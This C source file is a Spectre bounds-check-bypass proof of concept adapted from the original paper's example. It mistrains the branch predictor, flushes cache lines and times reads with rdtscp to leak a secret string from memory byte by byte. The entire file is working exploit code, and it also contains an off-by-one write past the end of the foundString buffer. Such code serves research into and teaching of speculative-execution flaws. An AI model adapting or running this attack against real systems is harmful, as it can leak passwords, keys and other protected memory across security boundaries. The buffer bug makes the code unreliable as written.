/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#include <sched.h>
#include <string.h>
#include "helper.h"

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        12,
        13,
        14,
        15,
        16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}


/********************************************************************
Analysis code
********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int valueScore[2]) {
    static int results[256];
    int tries, i, j, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;

    for (tries = 999; tries > 0; tries--) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            /* Delay (can also mfence) */
            wait();

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
//            printf("%p", x);
//            printf("\n");
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];

            /*
            We need to accurately measure the memory access to the current index of the
            array, so we can determine which index was cached by the malicious misdirected code.

            The best way to do this is to use the rdtscp instruction, which measures current
            processor ticks, and is also serialized.
            */

            time1 = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if ((int) time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }
    }

    j = 0;
    for (i = 0; i < 256; i++) {
        if (results[i] >= results[j]) {
            j = i;
        }
    }
    valueScore[0] = (uint8_t) j;
    valueScore[1] = results[j];
}

int main() {
    /* Default to a cache hit threshold of 80 */
    int cache_hit_threshold = 80;

    /* Default for malicious_x is the secret string address */
    size_t malicious_x = (size_t) (secret - (char *) array1);

    /* Default addresses to read is 40 (which is the length of the secret string) */
    char foundString[strlen(secret)];
    int valueScore[2];
    int i;

    for (i = 0; i < (int) sizeof(array2); i++) {
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    }


    /* Print cache hit threshold */
    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
    printf("Reading %d bytes:\n", (int) sizeof(foundString));

    /* Start the read loop to read each address */
    for (i = 0; i < (int) sizeof(foundString); i++) {
        printf("Reading at malicious_x = %p... ", (void *) malicious_x);

        /* Call readMemoryByte with the required cache hit threshold and
           malicious x address. value and score are arrays that are
           populated with the results.
        */
        readMemoryByte(cache_hit_threshold, malicious_x, valueScore);
        malicious_x++;

        foundString[i] = (char) (valueScore[0] > 31 && valueScore[0] < 127 ? valueScore[0] : '?');

        /* Display the results */
        printf("0x%02X=’%c’ score=%d ", valueScore[0], foundString[i], valueScore[1]);
        printf("\n");
    }
    foundString[i] = '\0';
    printf("Secret: %s\n", secret);
    printf("Found : %s", foundString);
    return (0);
}
